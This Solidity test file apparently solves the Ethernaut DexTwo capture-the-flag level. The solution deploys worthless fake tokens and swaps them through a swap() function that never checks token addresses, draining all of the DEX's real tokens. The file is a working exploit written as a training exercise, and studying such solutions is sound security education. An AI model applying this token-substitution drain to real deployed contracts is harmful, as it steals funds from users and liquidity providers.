// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/DexTwo.sol";
import "src/levels/DexTwoFactory.sol";

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract TestDexTwo is BaseTest {
    DexTwo private level;

    ERC20 token1;
    ERC20 token2;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new DexTwoFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /**
         * CODE YOUR SETUP HERE
         */
        levelAddress = payable(this.createLevelInstance(true));
        level = DexTwo(levelAddress);

        // Check that the contract is correctly setup

        token1 = ERC20(level.token1());
        token2 = ERC20(level.token2());
        assertEq(token1.balanceOf(address(level)) == 100 && token2.balanceOf(address(level)) == 100, true);
        assertEq(token1.balanceOf(player) == 10 && token2.balanceOf(player) == 10, true);
    }

    function exploitLevel() internal override {
        /**
         * CODE YOUR EXPLOIT HERE
         */

        // In this dex we can even steal all of the tokens for basically free
        // Swap() function is modified in such a way, that it now does not check which tokens are provided for it's execition
        // We can create a shitcoin with no value, mint any amount of it and swap it for the real tokens in the dex

        vm.startPrank(player, player);

        // Create two fake tokens and mint to player
        SwappableTokenTwo fakeToken1 = new SwappableTokenTwo(levelAddress, "Fake Token 1", "FT1", 2);
        SwappableTokenTwo fakeToken2 = new SwappableTokenTwo(levelAddress, "Fake Token 2", "FT2", 2);

        // Transfer fake tokens to the dex, so that amounts of fake tokens to send can be calculated
        fakeToken1.transfer(address(level), 1);
        fakeToken2.transfer(address(level), 1);

        // Approve dex for all our tokens
        token1.approve(address(level), type(uint256).max);
        token2.approve(address(level), type(uint256).max);
        fakeToken1.approve(address(level), type(uint256).max);
        fakeToken2.approve(address(level), type(uint256).max);

        // Figure out the amounts of fake tokens to send to the dex in order to substitute the real tokens
        uint256 token2Steal = token2.balanceOf(address(level));
        uint256 fakeToken1In = (token2Steal * fakeToken1.balanceOf(address(level))) / token2Steal;

        uint256 token1Steal = token1.balanceOf(address(level));
        uint256 fakeToken2In = (token1Steal * fakeToken2.balanceOf(address(level))) / token1Steal;

        // Swap the fake tokens for the real ones
        level.swap(address(fakeToken1), address(token2), fakeToken1In);
        level.swap(address(fakeToken2), address(token1), fakeToken2In);

        vm.stopPrank();
    }
}
